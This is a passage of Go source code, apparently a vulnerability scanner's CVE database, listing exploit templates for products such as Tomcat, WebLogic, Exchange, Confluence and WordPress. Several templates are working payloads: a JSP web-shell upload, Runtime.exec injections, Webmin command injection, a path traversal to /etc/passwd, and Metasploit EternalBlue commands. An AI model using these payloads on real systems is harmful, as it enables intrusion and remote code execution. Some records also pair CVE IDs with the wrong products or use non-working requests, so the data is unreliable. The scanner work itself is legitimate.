		CVSS: 8.1, CWE: "CWE-434", Product: "Apache Tomcat", Version: "7.x-9.x", FixedIn: "various",
		Impact: "File upload leading to RCE", Remediation: "Enable readonly init parameter",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-12617"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)apache-coyote|tomcat`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Tomcat PUT webshell upload",
			Steps: []string{"PUT a JSP file to server"}, Request: "PUT /shell.jsp/ HTTP/1.1\r\nHost: TARGET\r\n\r\n<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
			Conditions: "Tomcat with readonly=false"},
	},
	{
		CVEID: "CVE-2017-1000353", Description: "Jenkins CLI RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-502", Product: "Jenkins", Version: "<= 2.56", FixedIn: "2.57",
		Impact: "Java deserialization RCE via CLI", Remediation: "Update Jenkins and disable CLI over Remoting",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-1000353"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)jenkins`}, {Type: "header", Match: `(?i)x-jenkins`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "Jenkins CLI deserialization exploit",
			Steps: []string{"Use jenkins-serial-exploit tool"}, Script: "java -jar jenkins-cli.jar -s TARGET/ connect-node <payload>",
			Conditions: "Jenkins <= 2.56 with CLI enabled"},
	},
	{
		CVEID: "CVE-2016-4437", Description: "Apache Shiro RememberMe Deserialization RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-502", Product: "Apache Shiro", Version: "< 1.2.5", FixedIn: "1.2.5",
		Impact: "Deserialization RCE via RememberMe cookie", Remediation: "Upgrade Shiro and change the default encryption key",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2016-4437"},
		Patterns:   []cvePattern{{Type: "cookie", Match: `(?i)rememberMe`}, {Type: "header", Match: `(?i)rememberme`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "Shiro RememberMe deserialization",
			Steps:      []string{"Generate ysoserial payload", "Encrypt with known key", "Set as rememberMe cookie"},
			Script:     "java -jar ysoserial.jar CommonsCollections5 'curl TARGET' | openssl enc -aes-128-cbc -K <key> -iv <iv> -base64",
			Conditions: "Shiro with default RememberMe key"},
	},
	{
		CVEID: "CVE-2015-1635", Description: "Microsoft IIS HTTP.sys Remote Code Execution", Severity: "critical",
		CVSS: 10.0, CWE: "CWE-119", Product: "Microsoft IIS", Version: "7.5-8.5", FixedIn: "April 2015 MS15-034",
		Impact: "RCE via HTTP.sys range header processing", Remediation: "Apply MS15-034 security update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2015-1635"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "IIS HTTP.sys exploit",
			Steps:      []string{"Send crafted Range header with large number"},
			Request:    "GET / HTTP/1.1\r\nHost: TARGET\r\nRange: bytes=0-18446744073709551615\r\n\r\n",
			Conditions: "IIS 7.5-8.5 with HTTP.sys"},
	},
	{
		CVEID: "CVE-2014-0160", Description: "Heartbleed OpenSSL Information Disclosure", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-119", Product: "OpenSSL", Version: "1.0.1-1.0.1f", FixedIn: "1.0.1g",
		Impact: "Memory disclosure via TLS heartbeat extension", Remediation: "Update OpenSSL, revoke and reissue SSL certificates",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2014-0160"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i).*`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "Heartbleed memory leak test",
			Steps:  []string{"Use heartbleed testing tools to extract server memory"},
			Script: "python heartbleed.py TARGET", Conditions: "OpenSSL 1.0.1-1.0.1f with heartbeat extension"},
	},
	{
		CVEID: "CVE-2023-4966", Description: "Citrix NetScaler Data Breach (CitrixBleed)", Severity: "critical",
		CVSS: 9.4, CWE: "CWE-119", Product: "Citrix NetScaler", Version: "", FixedIn: "14.1-8.50/13.1-49.15",
		Impact: "Sensitive information disclosure via buffer overflow", Remediation: "Upgrade NetScaler and terminate active sessions",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-4966"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)netscaler|citrix`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "CitrixBleed session token leak",
			Steps: []string{"Send crafted HTTP request to leak session tokens"}, Request: "GET /vpn/index.html HTTP/1.1\r\nHost: TARGET\r\nHost: TARGET\r\n\r\n",
			Conditions: "Unpatched Citrix NetScaler"},
	},
	{
		CVEID: "CVE-2023-20198", Description: "Cisco IOS XE Web UI Privilege Escalation", Severity: "critical",
		CVSS: 10.0, CWE: "CWE-269", Product: "Cisco IOS XE", Version: "", FixedIn: "October 2023 advisory",
		Impact: "Create admin account via web UI", Remediation: "Apply Cisco security advisory",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-20198"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)cisco`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Cisco IOS XE privilege escalation",
			Steps: []string{"Exploit web UI to create local user"}, Request: "POST /webui/main.html HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "IOS XE with HTTP server enabled"},
	},
	{
		CVEID: "CVE-2022-27925", Description: "Zimbra Collaboration RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-502", Product: "Zimbra Collaboration", Version: "< 8.8.15 Patch 31", FixedIn: "Patch 31",
		Impact: "Remote code execution via multipart upload", Remediation: "Apply Zimbra patches",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-27925"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)zimbra`}, {Type: "header", Match: `(?i)zimbra`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Zimbra Multipart upload RCE",
			Steps: []string{"Upload malicious SOAP XML"}, Request: "POST /Autodiscover/Autodiscover.xml HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Zimbra with RCE vulnerability"},
	},
	{
		CVEID: "CVE-2022-30190", Description: "Microsoft Follina MSMSDT RCE", Severity: "high",
		CVSS: 8.8, CWE: "CWE-78", Product: "Microsoft Windows", Version: "", FixedIn: "June 2022 patch",
		Impact: "RCE via MSDT diagnostic tool", Remediation: "Apply Windows patch or disable MSDT troubleshooter",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-30190"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|windows`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Follina via crafted document",
			Steps:      []string{"Create Office document with ms-msdt URI", "Trigger diagnostic troubleshooter"},
			Conditions: "Windows with MSDT enabled"},
	},
	{
		CVEID: "CVE-2021-34527", Description: "Windows Print Spooler Remote Code Execution (PrintNightmare)", Severity: "critical",
		CVSS: 8.8, CWE: "CWE-269", Product: "Windows Print Spooler", Version: "", FixedIn: "July 2021 CU",
		Impact: "RCE and privilege escalation via Print Spooler", Remediation: "Apply Windows update and disable Print Spooler if not needed",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-34527"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|windows`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "PrintNightmare LPE/RCE",
			Steps: []string{"Use PrintNightmare PoC to load DLL"}, Script: "python printnightmare.py TARGET",
			Conditions: "Windows with Print Spooler enabled"},
	},
	{
		CVEID: "CVE-2020-14882", Description: "Oracle WebLogic Server RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-78", Product: "Oracle WebLogic", Version: "10.3.6/12.1.3/12.2.1.3/14.1.1", FixedIn: "October 2020 CPU",
		Impact: "RCE via console path traversal", Remediation: "Apply Oracle CPU patch",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-14882"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)weblogic|oracle`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "WebLogic console RCE",
			Steps: []string{"Access /console/css/%252e%252e%252fconsole.portal"}, Request: "GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('id');\") HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "WebLogic with console enabled"},
	},
	{
		CVEID: "CVE-2019-11510", Description: "Pulse Secure VPN Arbitrary File Read", Severity: "critical",
		CVSS: 10.0, CWE: "CWE-22", Product: "Pulse Secure VPN", Version: "< 9.0R3.4", FixedIn: "9.0R3.4",
		Impact: "Unauthenticated file read including /etc/passwd", Remediation: "Apply Pulse Secure advisory",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-11510"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)pulse|ivanti`}, {Type: "header", Match: `(?i)pulse`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Pulse Secure file read",
			Steps: []string{"Read /etc/passwd via path traversal"}, Request: "GET /dana-na/../..//etc/passwd HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Pulse Secure VPN < 9.0R3.4"},
	},
	{
		CVEID: "CVE-2019-0192", Description: "Apache Solr Deserialization RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-502", Product: "Apache Solr", Version: "< 6.6.5", FixedIn: "6.6.5",
		Impact: "RCE via Java deserialization in config API", Remediation: "Upgrade Solr and enable authentication",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-0192"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)solr|apache-solr`}, {Type: "header", Match: `(?i)solr`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Solr deserialization RCE",
			Steps:      []string{"Set ZooKeeper host via config API", "Upload malicious Java serialized object"},
			Request:    "POST /solr/configs/hello HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Solr with ZooKeeper and unauthenticated API"},
	},
	{
		CVEID: "CVE-2018-7600", Description: "Drupal Drupalgeddon 2 RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-78", Product: "Drupal", Version: "7.x before 7.58", FixedIn: "7.58",
		Impact: "Remote code execution via Form API", Remediation: "Update Drupal to 7.58 or 8.5.1",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2018-7600"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)drupal`}, {Type: "cookie", Match: `(?i)SSESS`}, {Type: "meta", Match: `(?i)generator.*drupal`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Drupal Form API RCE",
			Steps: []string{"Submit crafted form data to trigger drupal_render"}, Request: "POST /user/register?_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: TARGET\r\n\r\nform_id=user_register_form&_wrapper_format=drupal_ajax",
			Conditions: "Drupal < 7.58 or < 8.5.1"},
	},
	{
		CVEID: "CVE-2019-15107", Description: "Webmin Remote Code Execution", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-78", Product: "Webmin", Version: "< 1.920", FixedIn: "1.920",
		Impact: "RCE via password_change.cgi", Remediation: "Update Webmin",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-15107"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)webmin`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Webmin password change RCE",
			Steps: []string{"Send POST to password_change.cgi with shell command"}, Request: "POST /password_change.cgi HTTP/1.1\r\nHost: TARGET\r\n\r\nuser=rootxx&sid=&pam=&expired=2&old=|id&new1=test&new2=test",
			Conditions: "Webmin < 1.920 with password change enabled"},
	},
	{
		CVEID: "CVE-2020-5902", Description: "F5 BIG-IP TMUI RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-22", Product: "F5 BIG-IP", Version: "", FixedIn: "various",
		Impact: "RCE via Traffic Management UI path traversal", Remediation: "Apply F5 security advisory",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-5902"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)bigip|f5`}, {Type: "header", Match: `(?i)bigip`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "BIG-IP TMUI traversal to RCE",
			Steps:      []string{"Access /tmui/login.jsp/..;/tmui/system/user/authproperties.jsp"},
			Request:    "GET /tmui/login.jsp/..;/tmui/system/user/authproperties.jsp HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "BIG-IP with TMUI exposed"},
	},
	{
		CVEID: "CVE-2021-27065", Description: "Microsoft Exchange Server-Side Request Forgery", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-918", Product: "Microsoft Exchange", Version: "", FixedIn: "March 2021 SU",
		Impact: "SSRF leading to arbitrary file write", Remediation: "Apply Exchange security update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-27065"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|exchange`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Exchange SSRF file write",
			Steps: []string{"Send OWA request with ExternalUrl parameter"}, Request: "POST /ecp/proxyLogon.ecp HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Unpatched Exchange"},
	},
	{
		CVEID: "CVE-2020-0796", Description: "SMBGhost Remote Code Execution", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-119", Product: "Windows SMBv3", Version: "", FixedIn: "March 2020 CU",
		Impact: "RCE via SMBv3 compression", Remediation: "Apply Windows update and disable SMBv3 compression",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-0796"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|windows`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "SMBGhost RCE exploit",
			Steps: []string{"Use publicly available PoC"}, Script: "python smbghost_rce.py TARGET",
			Conditions: "Windows with SMBv3.1.1 compression"},
	},
	{
		CVEID: "CVE-2017-0144", Description: "EternalBlue SMB Remote Code Execution", Severity: "critical",
		CVSS: 9.3, CWE: "CWE-119", Product: "Windows SMB", Version: "XP through 2012 R2", FixedIn: "MS17-010",
		Impact: "Remote code execution via SMBv1", Remediation: "Apply MS17-010 and disable SMBv1",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-0144"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|windows`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "EternalBlue via Metasploit",
			Steps: []string{"Use exploit/windows/smb/ms17_010_eternalblue"}, Script: "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; exploit'",
			Conditions: "Windows with SMBv1 enabled"},
	},
	{
		CVEID: "CVE-2017-0143", Description: "EternalRomance SMB Remote Code Execution", Severity: "critical",
		CVSS: 8.1, CWE: "CWE-119", Product: "Windows SMB", Version: "", FixedIn: "MS17-010",
		Impact: "RCE via SMB transaction", Remediation: "Apply MS17-010",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-0143"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "EternalRomance exploit",
			Steps: []string{"Use Metasploit module"}, Script: "msfconsole -x 'use exploit/windows/smb/ms17_010_psexec; set RHOSTS TARGET; exploit'",
			Conditions: "Windows with SMBv1"},
	},
	{
		CVEID: "CVE-2021-21985", Description: "VMware vSphere Client RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-20", Product: "VMware vSphere", Version: "<= 7.0 U2", FixedIn: "7.0 U2b",
		Impact: "RCE via vSphere Client deserialization", Remediation: "Apply VMware security advisory",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-21985"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)vmware|vsphere`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "vSphere Client RCE",
			Steps: []string{"Send crafted SOAP request to vSAN API"}, Request: "POST /ui/vsanPluginProvider HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "vSphere Client with vSAN enabled"},
	},
	{
		CVEID: "CVE-2020-0601", Description: "CurveBall - Windows CryptoAPI Spoofing", Severity: "high",
		CVSS: 8.1, CWE: "CWE-295", Product: "Windows CryptoAPI", Version: "", FixedIn: "January 2020 CU",
		Impact: "Certificate spoofing via elliptic curve vulnerability", Remediation: "Apply Windows security update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-0601"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "CurveBall certificate spoofing",
			Steps:      []string{"Generate spoofed certificate using compromised ECC parameters"},
			Conditions: "Windows CryptoAPI with ECC certificates"},
	},
	{
		CVEID: "CVE-2021-26857", Description: "Microsoft Exchange Deserialization (ProxyLogon chain)", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-502", Product: "Microsoft Exchange", Version: "", FixedIn: "March 2021 SU",
		Impact: "Deserialization RCE as SYSTEM", Remediation: "Apply Exchange security update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-26857"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|exchange`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Exchange deserialization via Unified Messaging",
			Steps: []string{"Chain with CVE-2021-26855 SSRF"}, Request: "POST /autodiscover/autodiscover.json HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Unpatched Exchange"},
	},
	{
		CVEID: "CVE-2023-22515", Description: "Atlassian Confluence Privilege Escalation", Severity: "critical",
		CVSS: 10.0, CWE: "CWE-269", Product: "Atlassian Confluence", Version: "", FixedIn: "October 2023 advisory",
		Impact: "Create admin account without authentication", Remediation: "Apply Confluence patch",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-22515"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)confluence|atlassian`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Confluence privilege escalation",
			Steps: []string{"Exploit /server-info.action endpoint"}, Request: "POST /server-info.action HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Confluence Data Center exposed to internet"},
	},
	{
		CVEID: "CVE-2021-4104", Description: "Apache Log4j 1.x JMSAppender RCE", Severity: "high",
		CVSS: 7.5, CWE: "CWE-502", Product: "Apache Log4j", Version: "1.x", FixedIn: "N/A - upgrade to Log4j2",
		Impact: "RCE via JMSAppender deserialization", Remediation: "Migrate to Log4j2",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-4104"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)java|log4j`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Log4j 1.x JMSAppender exploit",
			Steps:      []string{"Configure malicious JMS broker", "Trigger log event"},
			Conditions: "Application using Log4j 1.x with JMSAppender enabled"},
	},
	{
		CVEID: "CVE-2019-0211", Description: "Apache HTTP Server Privilege Escalation", Severity: "high",
		CVSS: 7.8, CWE: "CWE-269", Product: "Apache httpd", Version: "< 2.4.39", FixedIn: "2.4.39",
		Impact: "Local privilege escalation via scoreboard race condition", Remediation: "Upgrade Apache",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-0211"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)apache`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "Apache scoreboard exploit",
			Steps: []string{"Exploit race condition in worker management"}, Script: "gcc -o cve-2019-0211 cve-2019-0211.c && ./cve-2019-0211",
			Conditions: "Apache 2.4.17-2.4.38 with event MPM"},
	},
	{
		CVEID: "CVE-2023-36884", Description: "Microsoft Office HTML RCE", Severity: "high",
		CVSS: 8.3, CWE: "CWE-79", Product: "Microsoft Office", Version: "", FixedIn: "August 2023 CU",
		Impact: "RCE via crafted Office document", Remediation: "Apply Office security update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-36884"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Office HTML RCE via document",
			Steps:      []string{"Create crafted HTML document disguised as Office file"},
			Conditions: "User opening malicious document"},
	},
	{
		CVEID: "CVE-2022-41091", Description: "Windows Mark of the Web Security Bypass", Severity: "high",
		CVSS: 5.4, CWE: "CWE-693", Product: "Windows", Version: "", FixedIn: "November 2022 CU",
		Impact: "Bypass MOTW security check", Remediation: "Apply Windows update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-41091"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)windows`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "MOTW bypass with crafted ISO",
			Steps:      []string{"Create ISO with Mark of the Web removed"},
			Conditions: "Windows with SmartScreen enabled"},
	},
	{
		CVEID: "CVE-2021-26858", Description: "Microsoft Exchange Server-Side Forgery (ProxyLogon chain)", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-918", Product: "Microsoft Exchange", Version: "", FixedIn: "March 2021 SU",
		Impact: "SSRF leading to file write", Remediation: "Apply Exchange security update",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-26858"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)microsoft-iis|exchange`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Exchange SSRF file write",
			Steps: []string{"Chain with CVE-2021-26855"}, Request: "GET /owa/ HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Unpatched Exchange"},
	},
	{
		CVEID: "CVE-2023-25690", Description: "Apache HTTP Request Smuggling", Severity: "high",
		CVSS: 7.5, CWE: "CWE-444", Product: "Apache httpd", Version: "< 2.4.58", FixedIn: "2.4.58",
		Impact: "HTTP request smuggling leading to cache poisoning", Remediation: "Upgrade Apache to 2.4.58+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-25690"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)apache`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Apache request smuggling",
			Steps:      []string{"Send crafted HTTP request with conflicting Content-Length and Transfer-Encoding"},
			Request:    "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
			Conditions: "Apache with mod_proxy"},
	},
	{
		CVEID: "CVE-2022-26134", Description: "Atlassian Confluence OGNL Injection RCE", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-917", Product: "Atlassian Confluence", Version: "", FixedIn: "June 2022 advisory",
		Impact: "RCE via OGNL injection in URI", Remediation: "Apply Atlassian advisory",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-26134"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)confluence|atlassian`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Confluence OGNL injection",
			Steps:      []string{"Inject OGNL expression in URL path"},
			Request:    "GET /%24%7Bognl%7D HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Unpatched Confluence"},
	},
	{
		CVEID: "CVE-2022-42889", Description: "Apache Commons Text RCE (Text4Shell)", Severity: "critical",
		CVSS: 9.8, CWE: "CWE-94", Product: "Apache Commons Text", Version: "1.5-1.9", FixedIn: "1.10.0",
		Impact: "RCE via string interpolation", Remediation: "Upgrade Commons Text to 1.10.0+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-42889"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)java|tomcat|apache`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Text4Shell interpolation RCE",
			Steps:      []string{"Inject ${script:js:java.lang.Runtime.getRuntime().exec('id')} in parameters"},
			Request:    "GET /?search=$%7Bscript:js:java.lang.Runtime.getRuntime().exec('id')%7D HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Application using Commons Text 1.5-1.9"},
	},
	{
		CVEID: "CVE-2018-1002155", Description: "WordPress REST API Privilege Escalation", Severity: "high",
		CVSS: 7.5, CWE: "CWE-863", Product: "WordPress", Version: "< 4.9.6", FixedIn: "4.9.6",
		Impact: "Unauthorized post manipulation via REST API", Remediation: "Update WordPress",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2018-1002155"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)wp-content|wordpress`}, {Type: "cookie", Match: `(?i)wordpress_`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "WordPress REST API exploit",
			Steps: []string{"Access /wp-json/wp/v2/posts/"}, Request: "GET /wp-json/wp/v2/posts/?id=1 HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "WordPress < 4.9.6 with REST API enabled"},
	},
	{
		CVEID: "CVE-2019-6766", Description: "WordPress PHP Object Injection", Severity: "high",
		CVSS: 7.5, CWE: "CWE-502", Product: "WordPress", Version: "< 5.0.1", FixedIn: "5.0.1",
		Impact: "Remote code execution via PHP object injection", Remediation: "Update WordPress to 5.0.1+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-6766"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)wordpress|wp-content`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "WordPress PHP object injection",
			Steps:      []string{"Craft serialized payload in post title"},
			Conditions: "WordPress < 5.0.1"},
	},
	{
		CVEID: "CVE-2017-5487", Description: "WordPress User Enumeration", Severity: "low",
		CVSS: 3.7, CWE: "CWE-200", Product: "WordPress", Version: "< 4.7.1", FixedIn: "4.7.1",
		Impact: "Username enumeration via REST API", Remediation: "Update WordPress",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-5487"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)wp-content|wordpress`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "WordPress user enumeration",
			Steps:      []string{"Access /wp-json/wp/v2/users/ to enumerate usernames"},
			Request:    "GET /wp-json/wp/v2/users/ HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "WordPress with REST API enabled"},
	},
	{
		CVEID: "CVE-2021-29447", Description: "WordPress SSRF via Media Upload", Severity: "medium",
		CVSS: 5.4, CWE: "CWE-918", Product: "WordPress", Version: "<= 5.7.0", FixedIn: "5.7.1",
		Impact: "Server-side request forgery via XXE in media upload", Remediation: "Update WordPress to 5.7.1",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-29447"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)wp-content|wordpress`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "WordPress SSRF via WAV upload",
			Steps: []string{"Upload crafted WAV file with XXE payload"}, Request: "POST /wp-admin/upload.php HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "WordPress <= 5.7.0 with media upload"},
	},
	{
		CVEID: "CVE-2022-21661", Description: "WordPress SQL Injection in WP_Query", Severity: "high",
		CVSS: 7.2, CWE: "CWE-89", Product: "WordPress", Version: "< 5.8.3", FixedIn: "5.8.3",
		Impact: "SQL injection via custom font upload", Remediation: "Update WordPress to 5.8.3+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-21661"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)wordpress|wp-content`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "WordPress SQL injection via font upload",
			Steps: []string{"Upload malicious font file triggering SQL error"}, Conditions: "WordPress < 5.8.3"},
	},
	{
		CVEID: "CVE-2021-44790", Description: "Apache HTTP Server mod_lua buffer overflow",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-120", Product: "Apache httpd", Version: "<2.4.51", FixedIn: "2.4.51",
		Impact: "RCE via buffer overflow in mod_lua", Remediation: "Upgrade Apache httpd or disable mod_lua",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-44790"},
		Patterns:   []cvePattern{{Type: "server", Match: `(?i)Apache/2\.4\.([0-9]|[12][0-9]|3[0-9]|4[0-8])`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Requires mod_lua with specific API usage",
			Steps:      []string{"Identify Apache using mod_lua", "Craft oversized input to trigger buffer overflow"},
			Conditions: "mod_lua must be enabled",
		},
	},
	{
		CVEID: "CVE-2021-39239", Description: "Apache httpd request smuggling via Transfer-Encoding",
		Severity: "high", CVSS: 7.5, CWE: "CWE-444", Product: "Apache httpd", Version: "<2.4.51", FixedIn: "2.4.51",
		Impact: "HTTP request smuggling leading to cache poisoning or XSS", Remediation: "Upgrade Apache httpd to 2.4.51+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-39239"},
		Patterns:   []cvePattern{{Type: "server", Match: `(?i)Apache`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Request smuggling via Transfer-Encoding",
			Steps:      []string{"Send request with malformed Transfer-Encoding header"},
			Request:    "GET / HTTP/1.1\r\nHost: TARGET\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: identity\r\n\r\n0\r\n\r\n",
			Conditions: "Reverse proxy in front of Apache",
		},
	},
	{
		CVEID: "CVE-2017-15411", Description: "Apache httpd HTTPoxy - CGI scripts vulnerable to proxy injection",
		Severity: "high", CVSS: 7.5, CWE: "CWE-20", Product: "Apache httpd", Version: "<2.4.27", FixedIn: "2.4.27",
		Impact: "HTTP proxy injection via CGI scripts", Remediation: "Upgrade Apache httpd or block Proxy header",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-15411"},
		Patterns:   []cvePattern{{Type: "path", Match: `(?i)/cgi-bin/`}, {Type: "server", Match: `(?i)Apache`}},
